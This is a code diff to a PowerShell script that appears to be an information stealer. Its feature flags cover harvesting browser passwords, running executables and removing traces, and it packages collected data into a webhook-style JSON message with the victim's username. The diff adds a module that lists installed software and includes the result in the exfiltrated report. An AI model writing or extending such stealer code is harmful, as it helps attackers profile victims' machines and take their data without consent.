@@ -34,6 +34,7 @@ $features = @{
     "gatherOpenPorts" = $true
     "executeExe" = $false
     "gatherBrowserPass" = $false
+    "gatherInstalledSoftware" = $true
     "removeTraces" = $true
 }
 foreach ($feature in $features.Keys) { if (-not (Test-Path "variable:$feature")) { Set-Variable -Name $feature -Value $features[$feature] } }
@@ -96,6 +97,15 @@ if ($gatherOpenPorts) {
     $tcpPorts = Get-NetTCPConnection | Where-Object { $_.State -eq 'Listen' } | Select-Object -ExpandProperty LocalPort -Unique
     $udpPorts = Get-NetUDPEndpoint | Select-Object -ExpandProperty LocalPort -Unique
     $openPorts = "TCP: `n$($tcpPorts -join ', ')`n`nUDP: `n$($udpPorts -join ', ')"
+}
+
+<# Installed Software #>
+if ($gatherInstalledSoftware) {
+    Write-Output "[ + ] Gathering installed softwares"
+    $installedSoftware = Get-ChildItem -Path "C:\Program Files" | Select-Object -ExpandProperty Name | Out-String
+    if ([string]::IsNullOrEmpty($installedSoftware)) {
+        $installedSoftware = "ERROR: No software found or access denied"
+    }
 }
 
 <# Execute File #>
@@ -195,6 +205,16 @@ $json = @{
                 }
             }
         }
+        if ($gatherInstalledSoftware) {
+            @{
+                description = "``````$($installedSoftware)``````"
+                color = 0
+                author = @{
+                    name = "Installed Software"
+                }
+            }
+        }
+            
     )
     username = "$env:USERNAME :3"
     avatar_url = "https://r2.e-z.host/4d0a0bea-60f8-44d6-9e74-3032a64a9f32/hjz7cham.png"
